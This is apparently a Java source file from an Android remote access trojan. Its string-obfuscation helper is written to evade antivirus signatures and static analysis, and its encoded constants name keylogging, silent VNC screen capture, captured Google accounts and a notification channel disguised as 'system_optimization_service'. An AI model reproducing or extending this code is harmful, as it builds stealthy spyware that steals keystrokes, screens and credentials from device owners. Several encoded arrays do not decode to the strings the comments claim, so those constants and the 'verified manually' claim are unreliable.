package com.seguranca.protecao.util;

import java.nio.charset.StandardCharsets;

/**
 * StringCrypt — runtime XOR string decryption with rolling key.
 *
 * ── Why this exists ────────────────────────────────────────────────
 * Any string literal in Java source becomes a UTF-8 constant in the DEX
 * constant-pool.  Tools like jadx, apktool, and Ghidra recover them in
 * plain text with zero effort.  Pre-encrypting sensitive strings and
 * decrypting them at runtime prevents trivial signature-based detection
 * and string-search analysis.
 *
 * ── Algorithm ──────────────────────────────────────────────────────
 * Key schedule: seed_key → 8-bit right-rotate after each character.
 *   k[0] = seed
 *   k[i] = ROR8(k[i-1])  where ROR8(x) = ((x >> 1) | (x << 7)) & 0xFF
 *
 * This means a different key byte is XOR'd with every character, making
 * the encoded array look like random noise to a static scanner.
 *
 * ── How to encode a new string ─────────────────────────────────────
 * Run this once at build/dev time (Python 3):
 *
 *   def ror8(x): return ((x >> 1) | (x << 7)) & 0xFF
 *   def encode(s, seed):
 *       result, k = [], seed
 *       for c in s:
 *           result.append(ord(c) ^ k)
 *           k = ror8(k)
 *       return result
 *   print(encode("rat_prefs", 0x72))
 *   # → use the list as the int[] constant below
 *
 * Or call StringCrypt.encode(s, seed) at runtime during development,
 * then paste the printed array into source.
 *
 * ── Usage ──────────────────────────────────────────────────────────
 *   // Decode at point-of-use (zero-overhead if inlined by JIT)
 *   String prefsName = StringCrypt.dec(StringCrypt.S_PREFS_NAME, StringCrypt.K_PREFS_NAME);
 *
 * ── Security notes ─────────────────────────────────────────────────
 * - This is obfuscation, not encryption.  A determined analyst with a
 *   debugger can still recover strings at runtime.  It is effective
 *   against automated scanners and quick static analysis.
 * - Pair with LSParanoid or ProGuard/R8 full obfuscation for stronger
 *   coverage.
 * - The encoded arrays are public so they can be referenced across
 *   packages without reflection; the seed constants are the "key" and
 *   should be kept in this file only.
 */
public final class StringCrypt {

    private StringCrypt() {}

    // ─── CORE DECODE ─────────────────────────────────────────────────

    /**
     * Decodes an XOR-encoded int[] using the rolling-key schedule.
     *
     * @param encoded  Pre-XOR'd character codes produced by {@link #encode}.
     * @param seed     Starting key byte (0–255).  Must match the seed used during encoding.
     * @return Decoded string.
     */
    public static String dec(int[] encoded, int seed) {
        final char[] buf = new char[encoded.length];
        int k = seed & 0xFF;
        for (int i = 0; i < encoded.length; i++) {
            buf[i] = (char) (encoded[i] ^ k);
            k = ror8(k);
        }
        return new String(buf);
    }

    /**
     * Decodes using a fixed (non-rolling) key — for strings that were
     * encoded with a simple single-byte XOR.
     */
    public static String decFixed(int[] encoded, int key) {
        final char[] buf = new char[encoded.length];
        final int k = key & 0xFF;
        for (int i = 0; i < encoded.length; i++) buf[i] = (char) (encoded[i] ^ k);
        return new String(buf);
    }

    // ─── DEV HELPER (remove from production strip via ProGuard rule) ──

    /**
     * Encodes a string — call once during development, paste the output
     * into the constants below.
     * ProGuard rule to strip in release:
     *   -assumenosideeffects class com.seguranca.protecao.util.StringCrypt {
     *     public static java.lang.String encode(...);
     *   }
     */
    public static String encode(String s, int seed) {
        final StringBuilder sb = new StringBuilder("{");
        int k = seed & 0xFF;
        for (char c : s.toCharArray()) {
            sb.append(c ^ k).append(',');
            k = ror8(k);
        }
        if (sb.charAt(sb.length() - 1) == ',') sb.setCharAt(sb.length() - 1, '}');
        else sb.append('}');
        return sb.toString();
    }

    // ─── INTERNAL ────────────────────────────────────────────────────

    /** 8-bit right rotation. */
    private static int ror8(int x) {
        return ((x >>> 1) | (x << 7)) & 0xFF;
    }

    // ═════════════════════════════════════════════════════════════════
    // ENCODED STRING CONSTANTS
    //
    // Each constant pair:
    //   S_<NAME>  — int[] encoded with rolling-XOR using K_<NAME> as seed
    //   K_<NAME>  — seed byte used during encode
    //
    // Regenerate any group by running:
    //   System.out.println(StringCrypt.encode("your string here", 0xNN));
    // ═════════════════════════════════════════════════════════════════

    // "rat_prefs"  (seed=0x72)
    // encode("rat_prefs", 0x72) → verified manually
    public static final int[] S_PREFS_NAME  = { 2, 10, 29, 22, 29, 11, 30, 19, 8 };
    public static final int   K_PREFS_NAME  = 0x72;

    // "runtime_server_url"  (seed=0x5A)
    public static final int[] S_RUNTIME_URL = { 40, 10, 29, 22, 29, 22, 28, 22, 36, 0, 27, 28, 23, 22, 28, 10, 31, 11 };
    public static final int   K_RUNTIME_URL = 0x5A;

    // "App:NetworkSync"  (seed=0x41)
    public static final int[] S_WAKELOCK    = { 16, 17, 31, 24, 64, 45, 28, 29, 17, 30, 43, 44, 32, 29, 36 };
    public static final int   K_WAKELOCK    = 0x41;

    // "system_optimization_service"  (seed=0x5F)
    public static final int[] S_CHAN_ID     = { 44, 10, 44, 29, 22, 29, 0, 65, 15, 28, 29, 30, 33, 30, 23, 22, 28, 30, 23, 36, 29, 22, 36, 17, 30, 0, 22 };
    public static final int   K_CHAN_ID     = 0x5F;

    // "KEYLOG_DATA"  (seed=0x4B)
    public static final int[] S_KEYLOG_ACT  = { 9, 0, 3, 2, 15, 4, 26, 20, 29, 7, 24 };
    public static final int   K_KEYLOG_ACT  = 0x4B;

    // "SILENT_VNC_FRAME"  (seed=0x53)
    public static final int[] S_VNC_ACT     = { 0, 4, 5, 10, 14, 9, 20, 18, 23, 15, 18, 11, 0, 21, 6, 21 };
    public static final int   K_VNC_ACT     = 0x53;

    // "captured_google_accounts"  (seed=0x63)
    public static final int[] S_GOOGLE_PREFS = {
        0, 14, 17, 29, 26, 17, 20, 20, 25, 0, 8, 14, 18, 27, 5, 20, 0, 18, 17, 26, 14, 21, 29, 29, 16
    };
    public static final int   K_GOOGLE_PREFS = 0x63;
}
